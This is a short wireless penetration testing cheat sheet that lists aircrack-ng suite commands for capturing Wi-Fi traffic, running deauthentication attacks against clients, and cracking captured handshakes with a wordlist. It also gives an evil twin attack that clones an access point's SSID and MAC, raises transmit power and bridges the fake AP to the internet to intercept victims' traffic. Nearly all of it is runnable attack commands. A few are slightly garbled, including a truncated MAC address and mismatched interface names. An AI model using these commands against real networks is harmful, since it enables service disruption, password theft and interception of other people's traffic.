# Wireless Penetration Testing

Check for conflicting processes

```
airmon-ng check kill
```

Place card into monitor mode

```
airmon-ng start wlan1
```

Find available devices

```
airodump-ng wlan1mon
```

Start capturing information
(channel 6)

```
airmon-ng -c 6 --bssid MAC -w capture wlan0mon

airodump-ng wlan1mon -w CAPTUREFILENAME -c 1

airodump-ng wlan1mon --bssid MAC --channel 1
```

Deauth attack

```
aireplay-ng -0 1 -a MAC_AP -c MAC_CLIENT

aireplay-ng --deauth 0 -c CLIENT -a MAC_AP wlan1mon
```

Crack password

```
aircrack-ng anynamehere-01.cap

aircrack-ng capture--1.cap -w rockyou.txt
```

### Or just use wifite

## Evil Twin Attack

```
airmon-ng start wlan1
airodump-ng wlan1mon

Create a New AP with Same SSID & MAC Address
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 11 wlan0

Deauthentication
aireplay-ng --deauth 0 -a 00:09:5B:6F:1E


Turn up the power
iwconfig wlan1 txpower 27
```

### Give the fake AP internet access

```
brctl addbr evil

brctl addif evil x0
This has internet access

brctl addif evil at0
This is create by airbase-ng (wired face of the wireless access point)

ifconfig x0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig evil up
dhclient3 evil &
```
